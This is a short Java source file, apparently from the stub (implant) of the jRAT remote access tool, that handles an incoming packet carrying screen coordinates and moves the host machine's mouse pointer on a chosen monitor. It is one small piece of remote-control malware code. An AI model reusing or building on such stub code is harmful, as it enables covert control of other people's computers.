package se.jrat.stub.packets.incoming;

import se.jrat.common.utils.Utils;
import se.jrat.stub.Connection;
import se.jrat.stub.utils.ScreenUtils;

public class Packet91MouseMove extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		int x = con.readInt();
		int y = con.readInt();
		int monitor = con.readInt();
		
		if (!Utils.isHeadless()) {
			if (monitor == -1) {
				ScreenUtils.getDefault().mouseMove(x, y);
			} else {
				ScreenUtils.getAllRobots()[monitor].mouseMove(x, y);
			}
		}
	}

}
